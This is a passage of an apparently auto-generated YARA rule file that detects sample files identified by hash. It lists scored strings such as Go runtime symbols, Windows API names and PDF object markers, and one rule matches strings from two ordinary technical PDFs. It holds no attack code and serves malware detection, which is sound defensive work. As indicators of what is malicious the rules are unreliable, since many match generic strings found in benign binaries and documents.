      $s13 = "Eyedropped tile that isn't in tileset" fullword ascii /* score: '11.00'*/
      $s14 = "bad zlib header" fullword ascii /* score: '11.00'*/
      $s15 = "%s/%s.cfg" fullword ascii /* score: '11.00'*/
      $s16 = "no header height" fullword ascii /* score: '11.00'*/
      $s17 = "bad Image Descriptor" fullword ascii /* score: '10.00'*/
      $s18 = "tnld.lld" fullword ascii /* score: '10.00'*/
      $s19 = "Checked %d-byte block %p previously freed/realloced at %s:%d" fullword ascii /* score: '9.50'*/
      $s20 = "wrong version" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _LLVM_Cookbook_PointerScope_Understanding_Pointer_Patching_for_Code_Randomization_4 {
   meta:
      description = "dataset - from files LLVM Cookbook.pdf, PointerScope_Understanding_Pointer_Patching_for_Code_Randomization.pdf"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "188ffec7e2c73dcc799b39d30abdb61ca0286633379a97439e3ab906893d00af"
      hash2 = "e77e212d2614a410cda2d1cdf2f7fa2aced0969faaba964a40f514fa70e4f72c"
   strings:
      $s1 = "/Type /FontDescriptor" fullword ascii /* score: '14.00'*/
      $s2 = "/Descent -216" fullword ascii /* score: '8.00'*/
      $s3 = "/CIDSystemInfo <<" fullword ascii /* score: '7.00'*/
      $s4 = "1 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "/Ascent 859" fullword ascii /* score: '4.00'*/
      $s6 = "4 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "16 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = "22 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s9 = "17 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = "23 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = "29 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s12 = "19 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s13 = "/AvgWidth 401" fullword ascii /* score: '4.00'*/
      $s14 = "21 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s15 = "14 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s16 = "26 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s17 = "20 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = "27 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = "28 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = "32 0 obj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x5025 and filesize < 13000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7c4ec96ba82e79cb37c6829a595dc09b76568a5dadd82c743c3f9a69c985ad83_9af4b3b8c67d21fef69dee132cb686d1cb9e34e2d5e807b05c2a92e48f_5 {
   meta:
      description = "dataset - from files 7c4ec96ba82e79cb37c6829a595dc09b76568a5dadd82c743c3f9a69c985ad83, 9af4b3b8c67d21fef69dee132cb686d1cb9e34e2d5e807b05c2a92e48f08dd39, 923de5fc24a860522375e93ea09e4298e5a1dfaa6a17c61754162aa3d4339bce, 956e66f820c127b655c4e59af455c4cc827d43b111f4cf260b6da1d30ac443b2"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7c4ec96ba82e79cb37c6829a595dc09b76568a5dadd82c743c3f9a69c985ad83"
      hash2 = "9af4b3b8c67d21fef69dee132cb686d1cb9e34e2d5e807b05c2a92e48f08dd39"
      hash3 = "923de5fc24a860522375e93ea09e4298e5a1dfaa6a17c61754162aa3d4339bce"
      hash4 = "956e66f820c127b655c4e59af455c4cc827d43b111f4cf260b6da1d30ac443b2"
   strings:
      $s1 = "wv.exe" fullword wide /* score: '16.00'*/
      $s2 = "pdmmgree.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "L$D+D$D" fullword ascii /* reversed goodware string 'D$D+D$L' */ /* score: '11.00'*/
      $s4 = "2!2*20262<2" fullword ascii /* score: '9.00'*/ /* hex encoded string '" &"' */
      $s5 = "LdrGetProcedureAk" fullword ascii /* score: '9.00'*/
      $s6 = "kernel320due3fromj" fullword wide /* score: '9.00'*/
      $s7 = "2, 9, 0, 0" fullword wide /* score: '9.00'*/ /* hex encoded string ')' */
      $s8 = ": :/:>:M:\\:" fullword ascii /* score: '7.00'*/
      $s9 = "\\OluJ(uZ" fullword ascii /* score: '5.00'*/
      $s10 = "=OuF /d" fullword ascii /* score: '5.00'*/
      $s11 = "(xbXf?" fullword ascii /* score: '4.00'*/
      $s12 = "sLAkOt*px" fullword ascii /* score: '4.00'*/
      $s13 = "1?1E1c1" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s14 = "aPMFm3<" fullword ascii /* score: '4.00'*/
      $s15 = ";HHfz+4o" fullword ascii /* score: '4.00'*/
      $s16 = "!AtbFDXt" fullword ascii /* score: '4.00'*/
      $s17 = ">maOs\"K[" fullword ascii /* score: '4.00'*/
      $s18 = "Nyhr*F|" fullword ascii /* score: '4.00'*/
      $s19 = "'5'`krWL$qUj" fullword ascii /* score: '4.00'*/
      $s20 = "1cNeC?2" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35_cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c0_6 {
   meta:
      description = "dataset - from files 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash2 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "os/exec.ExitError.Sys" fullword ascii /* score: '30.00'*/
      $s2 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
      $s3 = "os.(*ProcessState).sys" fullword ascii /* score: '30.00'*/
      $s4 = "os/exec.(*ExitError).Sys" fullword ascii /* score: '30.00'*/
      $s5 = "os/exec.Command" fullword ascii /* score: '24.00'*/
      $s6 = "os/exec.(*Cmd).closeDescriptors" fullword ascii /* score: '23.00'*/
      $s7 = "*exec.Cmd" fullword ascii /* score: '20.00'*/
      $s8 = "/*struct { F uintptr; pw *os.File; c *exec.Cmd }" fullword ascii /* score: '20.00'*/
      $s9 = "os/exec.(*Cmd).Run" fullword ascii /* score: '20.00'*/
      $s10 = "os/exec.(*Cmd).writerDescriptor.func1" fullword ascii /* score: '20.00'*/
      $s11 = "os/exec.(*Cmd).writerDescriptor" fullword ascii /* score: '20.00'*/
      $s12 = "syscall.GetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s13 = "syscall.GetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s14 = "syscall.GetProcessTimes" fullword ascii /* score: '19.00'*/
      $s15 = "*func(*os.Process) error" fullword ascii /* score: '18.00'*/
      $s16 = "os/exec.(*Cmd).Start.func1" fullword ascii /* score: '17.00'*/
      $s17 = "os/exec.(*Cmd).Output" fullword ascii /* score: '17.00'*/
      $s18 = "ing on unsupported descriptor typeno goroutines (main called runtime.Goexit) - deadlock!reflect.FuncOf does not support more tha" ascii /* score: '17.00'*/
      $s19 = "os/exec.(*Cmd).stdout" fullword ascii /* score: '17.00'*/
      $s20 = "os/exec.(*Cmd).Wait" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_7 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash4 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
   strings:
      $x1 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii /* score: '52.00'*/
      $x2 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x3 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '49.00'*/
      $x4 = "unknown pcuser32.dllws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= idleprocs= in status  mallocing= ms clock," ascii /* score: '47.00'*/
      $x5 = " is currently not supported for use in system callbacksSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zonesbufio.Scanner:" ascii /* score: '39.00'*/
      $x6 = "EnumValueWRegOpenKeyExWRtlGetVersionShellExecuteWStartServiceWThread32FirstVirtualUnlockWTSFreeMemoryWriteConsoleWbad flushGen b" ascii /* score: '34.00'*/
      $x7 = "GOMAXPROCSGetIfEntryGetVersionGlagoliticIsValidSidKharoshthiLockFileExManichaeanOld_ItalicOld_PermicOld_TurkicOpenEventWOpenMute" ascii /* score: '34.00'*/
      $x8 = " p scheddetailsechost.dllsecur32.dllshell32.dllshort writetracealloc(unreachableuserenv.dll KiB total,  [recovered] allocCount  " ascii /* score: '31.00'*/
      $s9 = "bad defer entry in panicbad defer size class: i=bypassed recovery failedcan't scan our own stackconnection reset by peerdouble t" ascii /* score: '28.00'*/
      $s10 = "nal header: %vfailure to read optional header magic: %vgcSweep being done but phase is not GCoffmheap.freeSpanLocked - invalid s" ascii /* score: '28.00'*/
      $s11 = "unknown pcuser32.dllws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= idleprocs= in status  mallocing= ms clock," ascii /* score: '24.00'*/
      $s12 = "bytes.Buffer: reader returned negative count from ReadgcControllerState.findRunnable: blackening not enabledinternal error: poll" ascii /* score: '23.00'*/
      $s13 = "es are asleep - deadlock!cannot exec a shared library directlycipher: message authentication failedcrypto/cipher: invalid buffer" ascii /* score: '22.00'*/
      $s14 = "ddrInfoWGC sweep waitGetDriveTypeWGunjala_GondiMapViewOfFileMasaram_GondiMende_KikakuiOld_HungarianRegDeleteKeyWRegEnumKeyExWReg" ascii /* score: '22.00'*/
      $s15 = "loat64nan3gccheckmarkgetpeernamegetsocknamei/o timeoutmSpanManualmethodargs(mswsock.dllnetpollInitreflectOffsruntime: P runtime:" ascii /* score: '21.00'*/
      $s16 = "druntime: netpoll: PostQueuedCompletionStatus failedConvertSecurityDescriptorToStringSecurityDescriptorWConvertStringSecurityDes" ascii /* score: '21.00'*/
      $s17 = " out of syncs.allocCount != s.nelems && freeIndex == s.nelemsslice bounds out of range [::%x] with capacity %yattempt to execute" ascii /* score: '20.00'*/
      $s18 = "morebuf={pc:advertise errorasyncpreemptoffforce gc (idle)invalid pointerkey has expiredmalloc deadlockmisaligned maskmissing add" ascii /* score: '19.00'*/
      $s19 = " is currently not supported for use in system callbacksSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zonesbufio.Scanner:" ascii /* score: '19.00'*/
      $s20 = ": releaseSudog with non-nil gp.paramruntime:stoplockedm: lockedg (atomicstatus=unfinished open-coded defers in deferreturnunknow" ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_8 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash4 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash5 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      hash6 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
   strings:
      $x1 = "152587890625762939453125Bidi_ControlCoCreateGuidCreateEventWCreateMutexWErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengt" ascii /* score: '55.00'*/
      $x2 = ",M3.2.0,M11.1.0476837158203125<invalid Value>ASCII_Hex_DigitAddDllDirectoryCLSIDFromStringCreateHardLinkWDeviceIoControlDuplicat" ascii /* score: '37.00'*/
      $x3 = "1907348632812595367431640625CertCloseStoreControlServiceCreateEventExWCreateMutexExWCreateProcessWCreateServiceWCryptGenRandomCu" ascii /* score: '32.00'*/
      $s4 = "1907348632812595367431640625CertCloseStoreControlServiceCreateEventExWCreateMutexExWCreateProcessWCreateServiceWCryptGenRandomCu" ascii /* score: '30.00'*/
      $s5 = "mstartbad sequence numberbad value for fieldbinary.LittleEndiandevice not a streamdirectory not emptydisk quota exceededdodeltim" ascii /* score: '30.00'*/
      $s6 = "= flushGen  gfreecnt= pages at  runqsize= runqueue= s.base()= spinning= stopwait= sweepgen  sweepgen= targetpc= throwing= until " ascii /* score: '28.00'*/
      $s7 = "hSidGetProcessIdGetStdHandleGetTempPathWJoin_ControlLittleEndianLoadLibraryWMeetei_MayekOpenServiceWPahawh_HmongRCodeRefusedRCod" ascii /* score: '27.00'*/
      $s8 = "152587890625762939453125Bidi_ControlCoCreateGuidCreateEventWCreateMutexWErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengt" ascii /* score: '26.00'*/
      $s9 = "eHandleFailed to find Failed to load FindNextVolumeWFindVolumeCloseFlushViewOfFileGetAdaptersInfoGetCommandLineWGetProcessTimesG" ascii /* score: '26.00'*/
      $s10 = "cialmspanSpecialnetapi32.dllno such hostnot pollableraceFiniLockreleasep: m=runtime: gp=runtime: sp=self-preemptshort bufferspan" ascii /* score: '24.00'*/
      $s11 = "nWFixedStack is not power-of-2GetFileInformationByHandleExGetProcessShutdownParametersGetSecurityDescriptorControlInitializeSecu" ascii /* score: '23.00'*/
      $s12 = "enMembershipCreateProcessAsUserWCryptAcquireContextWEgyptian_HieroglyphsGetAcceptExSockaddrsGetAdaptersAddressesGetCurrentDirect" ascii /* score: '23.00'*/
      $s13 = "golang.org/x/sys/windows.CloseOnExec" fullword ascii /* score: '22.00'*/
      $s14 = "unlock: lock countsigsend: inconsistent statestack size not a power of 2startm: negative nmspinningstopTheWorld: holding locksti" ascii /* score: '22.00'*/
      $s15 = "sing deferreturnmspan.sweep: state=notesleep not on g0ntdll.dll not foundnwait > work.nprocspanic during mallocpanic during pani" ascii /* score: '21.00'*/
      $s16 = "etSecurityInfoGetStartupInfoWHanifi_RohingyaImpersonateSelfIsWow64Process2OpenThreadTokenOther_LowercaseOther_UppercaseProcess32" ascii /* score: '21.00'*/
      $s17 = "n_SyntaxProcess32NextWQuotation_MarkRCodeNameErrorRegSetValueExWSetConsoleModeSetFilePointerSetThreadTokenTranslateNameWVirtualP" ascii /* score: '21.00'*/
      $s18 = "eSuccessReadConsoleWReleaseMutexReportEventWResumeThreadRevertToSelfSetEndOfFileSetErrorModeSetStdHandleSora_SompengSyloti_Nagri" ascii /* score: '21.00'*/
      $s19 = "SetSpinesweepWaiterstraceStringswintrust.dllwirep: p->m=worker mode wtsapi32.dll != sweepgen  MB) workers= called from  flushedW" ascii /* score: '20.00'*/
      $s20 = "*windows.DLL" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _d120e20c7e868c1ce1b94ed63318be6d_d4b64e363b4b26f82ca61f3890329c9f0978820f4107eb3d95309bc9adbfd280_9 {
   meta:
      description = "dataset - from files d120e20c7e868c1ce1b94ed63318be6d, d4b64e363b4b26f82ca61f3890329c9f0978820f4107eb3d95309bc9adbfd280"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "942a315f52b49601cb8a2080fa318268f7a670194f9c5be108d936db32affd52"
      hash2 = "d4b64e363b4b26f82ca61f3890329c9f0978820f4107eb3d95309bc9adbfd280"
   strings:
      $s1 = "__mingw_winmain_lpCmdLine" fullword ascii /* score: '12.00'*/
      $s2 = "mingw_get_invalid_parameter_handler" fullword ascii /* score: '9.00'*/
      $s3 = "_head_lib64_libmsvcrt_os_a" fullword ascii /* score: '9.00'*/
      $s4 = "__mingw_module_is_dll" fullword ascii /* score: '9.00'*/
      $s5 = "__imp__get_invalid_parameter_handler" fullword ascii /* score: '9.00'*/
      $s6 = "X86_TUNE_MISALIGNED_MOVE_STRING_PRO_EPILOGUES" fullword ascii /* score: '9.00'*/
      $s7 = "managedapp" fullword ascii /* score: '8.00'*/
      $s8 = "startinfo" fullword ascii /* score: '8.00'*/
      $s9 = "mainret" fullword ascii /* score: '8.00'*/
      $s10 = "__p__acmdln.c" fullword ascii /* score: '7.00'*/
      $s11 = "register_frame_ctor" fullword ascii /* score: '7.00'*/
      $s12 = "complex _Float128" fullword ascii /* score: '7.00'*/
      $s13 = "__mingw_winmain_nShowCmd" fullword ascii /* score: '7.00'*/
      $s14 = ".refptr.__imp__acmdln" fullword ascii /* score: '7.00'*/
      $s15 = "__gcc_deregister_frame" fullword ascii /* score: '7.00'*/
      $s16 = "__gcc_register_frame" fullword ascii /* score: '7.00'*/
      $s17 = ".refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__" fullword ascii /* score: '7.00'*/
      $s18 = ".rdata$.refptr.__RUNTIME_PSEUDO_RELOC_LIST__" fullword ascii /* score: '7.00'*/
      $s19 = ".refptr.__RUNTIME_PSEUDO_RELOC_LIST__" fullword ascii /* score: '7.00'*/
      $s20 = ".rdata$.refptr.__imp__acmdln" fullword ascii /* score: '7.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9_cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c0_10 {
   meta:
      description = "dataset - from files 7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9"
      hash2 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.execLock" fullword ascii /* score: '19.00'*/
      $s4 = "syscall.procGetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s5 = "syscall.procGetProcessTimes" fullword ascii /* score: '19.00'*/
      $s6 = "syscall.procGetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s7 = "syscall.procGetCurrentProcessId" fullword ascii /* score: '19.00'*/
      $s8 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
      $s9 = "syscall.procOpenProcessToken" fullword ascii /* score: '17.00'*/
      $s10 = "runtime.hashkey" fullword ascii /* score: '16.00'*/
      $s11 = "runtime.printBacklog" fullword ascii /* score: '15.00'*/
      $s12 = "syscall.procGetTempPathW" fullword ascii /* score: '15.00'*/
      $s13 = "runtime.fastlog2Table" fullword ascii /* score: '15.00'*/
      $s14 = "runtime.faketime" fullword ascii /* score: '15.00'*/
      $s15 = "runtime.sweep" fullword ascii /* score: '15.00'*/
      $s16 = "syscall.procTerminateProcess" fullword ascii /* score: '14.00'*/
      $s17 = "syscall.procCreateProcessW" fullword ascii /* score: '14.00'*/
      $s18 = "syscall.procProcess32NextW" fullword ascii /* score: '14.00'*/
      $s19 = "syscall.procExitProcess" fullword ascii /* score: '14.00'*/
      $s20 = "syscall.procProcess32FirstW" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9_78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bd_11 {
   meta:
      description = "dataset - from files 7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7b2bb3a9b505b92b22502466ec2f3ba21f27a5264e85587ccac913c9260bbba9"
      hash2 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
   strings:
      $s1 = "*struct { lock runtime.mutex; free *runtime.gcBitsArena; next *runtime.gcBitsArena; current *runtime.gcBitsArena; previous *runt" ascii /* score: '18.00'*/
      $s2 = "2*struct { runtime.mutex; runtime.persistentAlloc }" fullword ascii /* score: '18.00'*/
      $s3 = "*struct { lock runtime.mutex; free *runtime.gcBitsArena; next *runtime.gcBitsArena; current *runtime.gcBitsArena; previous *runt" ascii /* score: '18.00'*/
      $s4 = "e*struct { lock runtime.mutex; next int32; m map[int32]unsafe.Pointer; minv map[unsafe.Pointer]int32 }" fullword ascii /* score: '18.00'*/
      $s5 = "N*struct { lock runtime.mutex; free runtime.mSpanList; busy runtime.mSpanList }" fullword ascii /* score: '18.00'*/
      $s6 = "runtime.(*gcSweepBuf).pop" fullword ascii /* score: '15.00'*/
      $s7 = "type..hash.syscall.DLL" fullword ascii /* score: '14.00'*/
      $s8 = "*runtime.tmpBuf" fullword ascii /* score: '14.00'*/
      $s9 = "runtime.memhash_varlen" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.aeshash64" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.aeshashstr" fullword ascii /* score: '13.00'*/
      $s12 = "runtime.memhash0" fullword ascii /* score: '13.00'*/
      $s13 = "runtime.ismapkey" fullword ascii /* score: '13.00'*/
      $s14 = "runtime.aeshash32" fullword ascii /* score: '13.00'*/
      $s15 = "nbgsweep" fullword ascii /* score: '13.00'*/
      $s16 = "runtime.aeshash" fullword ascii /* score: '13.00'*/
      $s17 = "npausesweep" fullword ascii /* score: '13.00'*/
      $s18 = "*runtime.traceBufHeader" fullword ascii /* score: '12.00'*/
      $s19 = "*runtime.sweepdata" fullword ascii /* score: '12.00'*/
      $s20 = "runtime.(*gcSweepBuf).numBlocks" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35_b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac3_12 {
   meta:
      description = "dataset - from files 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash2 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
   strings:
      $s1 = "math.Log" fullword ascii /* score: '19.00'*/
      $s2 = "sync.(*RWMutex).RUnlock" fullword ascii /* score: '18.00'*/
      $s3 = "sync.(*RWMutex).rUnlockSlow" fullword ascii /* score: '18.00'*/
      $s4 = "math.log2" fullword ascii /* score: '16.00'*/
      $s5 = "math.Log2" fullword ascii /* score: '16.00'*/
      $s6 = "*log.Logger" fullword ascii /* score: '15.00'*/
      $s7 = "sync.(*RWMutex).RLock" fullword ascii /* score: '15.00'*/
      $s8 = "net/url.UserPassword" fullword ascii /* score: '12.00'*/
      $s9 = "passwordSet" fullword ascii /* score: '12.00'*/
      $s10 = "net/url.InvalidHostError.Error" fullword ascii /* score: '12.00'*/
      $s11 = "net/url.(*InvalidHostError).Error" fullword ascii /* score: '12.00'*/
      $s12 = "log.New" fullword ascii /* score: '12.00'*/
      $s13 = "*url.InvalidHostError" fullword ascii /* score: '12.00'*/
      $s14 = "net/url.splitHostPort" fullword ascii /* score: '12.00'*/
      $s15 = "runtime.UnlockOSThread" fullword ascii /* score: '10.00'*/
      $s16 = "time.Time.Sub" fullword ascii /* score: '10.00'*/
      $s17 = "runtime.selectnbsend" fullword ascii /* score: '10.00'*/
      $s18 = "runtime.mapaccess1" fullword ascii /* score: '10.00'*/
      $s19 = "math.Abs" fullword ascii /* score: '10.00'*/
      $s20 = "runtime.LockOSThread" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966_78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bd_13 {
   meta:
      description = "dataset - from files 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash2 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      hash3 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      hash4 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      hash5 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "runtime.hexdumpWords.func1" fullword ascii /* score: '20.00'*/
      $s2 = "type..eq.runtime.rwmutex" fullword ascii /* score: '13.00'*/
      $s3 = "reflect.(*funcType).common" fullword ascii /* score: '11.00'*/
      $s4 = "reflect.(*ptrType).common" fullword ascii /* score: '11.00'*/
      $s5 = "internal/reflectlite.(*rtype).Comparable" fullword ascii /* score: '11.00'*/
      $s6 = "reflect.(*rtype).common" fullword ascii /* score: '11.00'*/
      $s7 = "internal/reflectlite.(*rtype).common" fullword ascii /* score: '11.00'*/
      $s8 = "reflect.(*rtype).Comparable" fullword ascii /* score: '11.00'*/
      $s9 = "runtime.gcEffectiveGrowthRatio" fullword ascii /* score: '10.00'*/
      $s10 = "reflect.makeComplex" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.gcWaitOnMark" fullword ascii /* score: '10.00'*/
      $s12 = "reflect.New" fullword ascii /* score: '10.00'*/
      $s13 = "reflect.cvtComplex" fullword ascii /* score: '10.00'*/
      $s14 = "reflect.Value.runes" fullword ascii /* score: '10.00'*/
      $s15 = ";*struct { F uintptr; frame *runtime.stkframe; bad uintptr }" fullword ascii /* score: '10.00'*/
      $s16 = "internal/reflectlite.(*rtype).Key" fullword ascii /* score: '10.00'*/
      $s17 = "reflect.cvtRunesString" fullword ascii /* score: '10.00'*/
      $s18 = "reflect.cvtStringRunes" fullword ascii /* score: '10.00'*/
